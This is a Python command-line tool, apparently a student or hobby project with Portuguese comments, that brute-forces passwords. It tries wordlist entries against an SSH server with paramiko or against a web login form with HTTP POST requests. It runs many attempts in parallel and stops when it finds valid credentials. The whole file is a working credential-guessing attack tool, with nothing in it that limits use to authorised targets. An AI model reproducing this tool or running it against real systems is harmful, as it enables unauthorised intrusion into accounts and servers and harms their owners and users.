import paramiko
import requests
import sys
import os
import argparse
from concurrent.futures import ThreadPoolExecutor
import threading

# Controle de concorrência
print_lock = threading.Lock()
credential_found = threading.Event()

def try_ssh_login(target_ip, target_port, username, password):
    if credential_found.is_set():
        return
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, port=target_port, username=username, password=password, timeout=3)
        with print_lock:
            print(f"\n\033[92m[+] SUCCESS (SSH) -> User: {username} | Pass: {password}\033[0m\n")
        credential_found.set()
    except paramiko.AuthenticationException:
        with print_lock:
            print(f"\033[91m[-] SSH Failed:\033[0m {username}:{password}")
    except Exception:
        pass
    finally:
        ssh.close()

def try_web_login(target_url, username, password):
    if credential_found.is_set():
        return
    
    # Payload padrão de formulário. Em ferramentas reais, o usuário pode customizar isso.
    dados_formulario = {
        "username": username,
        "password": password
    }

    try:
        resposta = requests.post(target_url, data=dados_formulario, timeout=4)
        mensagens_erro = ["incorreta", "invalid", "errado", "falhou", "incorreto", "erro", "failed"]
        
        if not any(erro in resposta.text.lower() for erro in mensagens_erro):
            with print_lock:
                print(f"\n\033[92m[+] SUCCESS (WEB) -> User: {username} | Pass: {password}\033[0m\n")
            credential_found.set()
        else:
            with print_lock:
                print(f"\033[91m[-] WEB Failed:\033[0m {username}:{password}")
    except Exception:
        with print_lock:
            print(f"[!] Connection Error on WEB with password: {password}")

def main():
    # Configuração do Gerenciador de Argumentos 
    parser = argparse.ArgumentParser(
        description="Python Brute Force Tool - Project",
        epilog="Example: python bruter.py -m SSH -t 127.0.0.1 -p 2222 -u user -w wordlist.txt"
    )
    
    # Argumentos Obrigatórios
    parser.add_argument("-m", "--mode", choices=["SSH", "WEB"], required=True, help="Ataque target protocol (SSH or WEB)")
    parser.add_argument("-u", "--user", required=True, help="Username to attack")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the password wordlist file")
    
    # Argumentos Opcionais dependendo do Modo
    parser.add_argument("-t", "--target", help="Target IP address (Required for SSH)")
    parser.add_argument("-p", "--port", type=int, default=22, help="Target port (Default: 22 for SSH)")
    parser.add_argument("--url", help="Target URL (Required for WEB mode, e.g., http://site.com)")
    parser.add_argument("--threads", type=int, default=4, help="Number of concurrent threads (Default: 4)")

    args = parser.parse_args()

    # Validações lógicas de segurança dos argumentos
    if not os.path.exists(args.wordlist):
        print(f"\033[91m[!] Error: Wordlist file '{args.wordlist}' not found.\033[0m")
        sys.exit(1)

    if args.mode == "SSH" and not args.target:
        print("\033[91m[!] Error: SSH mode requires a target IP (-t / --target).\033[0m")
        sys.exit(1)

    if args.mode == "WEB" and not args.url:
        print("\033[91m[!] Error: WEB mode requires a target URL (--url).\033[0m")
        sys.exit(1)

    # Carrega a Wordlist na memória
    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print("="*60)
    print(f"   STARTING BRUTE FORCE ATTACK [{args.mode}]")
    print("="*60)
    print(f"[*] Target User : {args.user}")
    print(f"[*] Wordlist    : {args.wordlist} ({len(passwords)} passwords)")
    print(f"[*] Threads     : {args.threads}")
    if args.mode == "SSH":
        print(f"[*] Target Host : {args.target}:{args.port}")
    else:
        print(f"[*] Target URL  : {args.url}")
    print("-"*60 + "\n")

    # Inicia o Pool de Threads Concorrentes
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for password in passwords:
            if credential_found.is_set():
                break
            
            if args.mode == "SSH":
                executor.submit(try_ssh_login, args.target, args.port, args.user, password)
            elif args.mode == "WEB":
                executor.submit(try_web_login, args.url, args.user, password)

    if not credential_found.is_set():
        print("\n[-] Attack finished. No valid credentials found.")

if __name__ == "__main__":
    main()
